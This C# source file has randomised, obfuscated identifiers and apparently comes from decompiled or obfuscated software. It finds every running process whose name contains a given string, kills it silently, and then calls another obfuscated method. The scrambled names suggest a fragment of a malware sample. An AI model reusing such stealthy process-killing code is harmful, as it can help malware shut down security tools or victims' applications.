using System;
using System.Diagnostics;

namespace frgoWklvEOSV;

public sealed class uqJYgZKhlojZx
{
	public static bool DvoQNbpdVPbO(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void VwoAOwnOGp(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (DvoQNbpdVPbO(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					GRQFeQGQfBG.uheBeCJUIksTneW();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
